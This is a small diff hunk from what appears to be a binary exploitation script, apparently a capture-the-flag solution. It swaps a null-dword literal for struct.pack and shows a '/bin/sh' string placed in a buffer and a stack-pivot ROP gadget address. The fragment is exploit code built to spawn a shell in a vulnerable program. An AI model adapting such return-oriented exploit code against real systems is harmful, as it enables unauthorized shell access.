@@ -7,7 +7,7 @@ binsh_index = 61 # Out of the way and 3x+1 (8 bytes of room)
 binsh_addr = buffer_addr + binsh_index*4
 
 STORE = "store\n"
-NULL_DWORD = "\x00"*4
+NULL_DWORD = struct.pack("<L", 0)
 
 # Gadgets
 add_esp_2c = 0x08049bb7 # add esp, 0x2c ; ret (Pivot)
